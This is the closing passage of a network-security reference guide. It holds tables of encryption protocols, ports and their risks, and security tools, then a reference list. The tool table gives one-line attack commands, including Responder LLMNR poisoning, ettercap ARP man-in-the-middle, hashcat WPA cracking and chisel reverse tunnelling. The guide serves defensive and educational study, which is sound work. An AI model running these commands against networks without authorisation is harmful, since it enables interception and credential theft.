reg add "HKLM\System\CurrentControlSet\Services\NetBT\Parameters\Interfaces\tcpip*" /v NbnsEnabled /t REG_DWORD /d 0 /f
```

---

## Encryption Protocol Quick Reference

| Protocol | Port | Key Exchange | Cipher | MAC | Forward Secrecy | Status |
|----------|------|-------------|--------|-----|-----------------|--------|
| SSL 3.0 | 443 | RSA | 3DES, RC4 | MD5, SHA1 | No | **Broken** - POODLE |
| TLS 1.0 | 443 | RSA, DH | AES-CBC, 3DES | MD5, SHA1 | Optional | **Deprecated** - BEAST |
| TLS 1.1 | 443 | RSA, DH | AES-CBC | SHA1 | Optional | **Deprecated** |
| TLS 1.2 | 443 | ECDHE, DHE | AES-GCM, ChaCha20 | SHA256, SHA384 | Yes (with ECDHE/DHE) | **Current - vulnerable to downgrade** |
| TLS 1.3 | 443 | ECDHE, DHE | AES-GCM, ChaCha20 | Poly1305 | **Mandatory** | **Current standard** |
| SSHv2 | 22 | DH Group Exchange, ECDH | AES-GCM, ChaCha20 | Poly1305, HMAC-SHA2 | Yes | **Current** |
| IPSec/IKEv2 | 500/4500 | IKE_SA (DH), ESP | AES-GCM, ChaCha20 | HMAC-SHA2 | Yes | **Current** |
| WPA2-PSK | - | 4-way handshake | AES-CCMP | HMAC-SHA1 | No (PSK derivation) | **Vulnerable** - KRACK |
| WPA3-SAE | - | Dragonfly (SAE) | AES-CCMP | HMAC-SHA256 | Yes | **Current - downgrade risk** |
| SNMPv3 | 161 | USM (HMAC-SHA/AES) | AES-128 | HMAC-SHA256 | N/A | **Current** |
| BGP | 179 | MD5 TCP | None | MD5 (TCP option) | No | **Weak** - MD5 only |
| DNSSEC | 53 | N/A (offline sig) | RSA/ECDSA/Ed25519 | RSA-SHA256, ECDSA-P256 | N/A | **Under-deployed** |

---

## Port and Protocol Quick Reference

| Port(s) | Protocol | Security Concern |
|---------|----------|-----------------|
| 20/21 | FTP | Plaintext credentials, PASV bouncing |
| 22 | SSH | Brute force, weak keys, agent forwarding |
| 23 | Telnet | Plaintext everything |
| 25 | SMTP | Open relay, STARTTLS stripping |
| 53 | DNS | Spoofing, amplification, tunneling |
| 67/68 | DHCP | Rogue server, starvation |
| 69 | TFTP | Plaintext, no auth |
| 80 | HTTP | Plaintext, injection |
| 110 | POP3 | Plaintext credentials |
| 123 | NTP | Amplification, amplification DDoS |
| 161/162 | SNMP | Default community strings, v1/v2c cleartext |
| 179 | BGP | Route hijacking, no path validation |
| 389 | LDAP | Plaintext, unauthenticated binds |
| 443 | HTTPS | Misconfigured TLS, HSTS bypass |
| 445 | SMB | EternalBlue, LLMNR poisoning, relay |
| 465/587 | SMTPS/Submission | STARTTLS downgrade |
| 993/995 | IMAPS/POP3S | Certificate validation |
| 1433 | MSSQL | Default instances, weak auth |
| 3306 | MySQL | Remote root access |
| 3389 | RDP | BlueKeep, credential theft |
| 5353 | mDNS | Local name resolution spoofing |
| 5355 | LLMNR | NTLM hash capture |
| 5900+ | VNC | Plaintext, weak auth |
| 8080 | HTTP Proxy | SSRF, open proxy |
| 8443 | HTTPS Alt | Self-signed certs |
| 9090 | WebSocket | Missing origin validation |

---

## Common Network Security Tools

| Tool | Category | Key Command |
|------|----------|-------------|
| Wireshark | Analysis | GUI packet analyzer |
| tcpdump | Capture | `tcpdump -i eth0 -w file.pcap` |
| nmap | Scanning | `nmap -sS -sV -p- target` |
| masscan | Discovery | `masscan -p1-65535 10.0.0.0/8 --rate=10000` |
| rustscan | Discovery | `rustscan -a target -- -sV` |
| Zeek/Bro | NIDS | Monitor + log network activity |
| Suricata | NIDS/IPS | `suricata -c suricata.yaml -i eth0` |
| Snort | NIDS/IPS | `snort -A console -q -c snort.conf -i eth0` |
| Security Onion | Platform | Zeek + Suricata + Wazuh + Stenographer |
| aircrack-ng | WiFi | See WiFi section above |
| bettercap | MITM | `bettercap -iface eth0` |
| Responder | LLMNR/NBT-NS | `Responder -I eth0 -wrf` |
| CrackMapExec | Post-exploit | `crackmapexec smb targets.txt` |
| zeek2nagios | Monitoring | Zeek alert integration |
| ettercap | MITM | `ettercap -T -q -i eth0 -M arp:remote /target// /gateway//` |
| hashcat | Cracking | `hashcat -m 22000 hash.hc22000 wordlist.txt` |
| Responder | LLMNR | `Responder -I eth0` |
| socat | Tunneling | `socat TCP-LISTEN:8080,fork TCP:target:80` |
| chisel | Tunneling | `chisel server --reverse` / `chisel client` |

## References

1. Rescorla, E., "The Transport Layer Security (TLS) Protocol Version 1.3," RFC 8446, August 2018. https://www.rfc-editor.org/rfc/rfc8446
2. Kaminsky, D., "DNS Infrastructure Attacks," 2008. https://www.doxpara.com
3. Vanhoef, M., "Key Reinstallation Attacks (KRACK)," CCS 2017. https://krackattacks.com
4. Vanhoef, M., Ronen, E., "Dragonblood: Security Analysis of WPA3's SAE," IEEE S&P 2020. https://dragonbloodAttack.com
5. NIST, "Zero Trust Architecture," SP 800-207, August 2020. https://csrc.nist.gov/publications/detail/sp/800-207/final
6. Suricata IDS/IPS Documentation. https://suricata.io/documentation/
7. Wireshark Documentation. https://www.wireshark.org/docs/
8. Snort Users Manual. https://www.snort.org/documents
9. RFC 7230–7235, "HTTP/1.1," June 2014. https://www.rfc-editor.org/rfc/rfc7230
10. RFC 4271, "BGP-4," January 2006. https://www.rfc-editor.org/rfc/rfc4271
11. RFC 6480, "RPKI," February 2012. https://www.rfc-editor.org/rfc/rfc6480
12. RFC 6811, "BGP Origin Validation," January 2013. https://www.rfc-editor.org/rfc/rfc6811
13. NIST SP 800-94, "Guide to Intrusion Detection and Prevention Systems," 2012. https://csrc.nist.gov/publications/detail/sp/800-94/final
14. NIST SP 800-41 Rev. 1, "Guidelines on Firewalls and Firewall Policy," September 2009. https://csrc.nist.gov/publications/detail/sp/800-41/rev-1/final
15. RFC 8446, "TLS 1.3," August 2018. https://www.rfc-editor.org/rfc/rfc8446
16. RFC 5246, "TLS 1.2," August 2008. https://www.rfc-editor.org/rfc/rfc5246
17. RFC 8484, "DNS Queries over HTTPS (DoH)," October 2018. https://www.rfc-editor.org/rfc/rfc8484
18. RFC 7858, "DNS over TLS (DoT)," May 2016. https://www.rfc-editor.org/rfc/rfc7858
19. RFC 4033–4035, "DNSSEC," March 2005. https://www.rfc-editor.org/rfc/rfc4033